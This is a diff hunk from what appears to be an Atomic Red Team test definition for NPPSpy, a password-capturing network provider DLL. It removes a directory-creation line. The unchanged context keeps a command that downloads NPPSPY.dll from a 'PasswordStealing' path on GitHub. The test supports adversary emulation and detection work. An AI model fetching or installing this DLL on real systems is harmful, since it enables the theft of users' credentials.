@@ -56,7 +56,6 @@ atomic_tests:
   - description: NPPSpy.dll must be available in ExternalPayloads directory
     prereq_command: if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll") {exit 0} else {exit 1}
     get_prereq_command: |-
-      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       Invoke-WebRequestVerifyHash "https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll" "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll" $null
   executor:
     command: |-
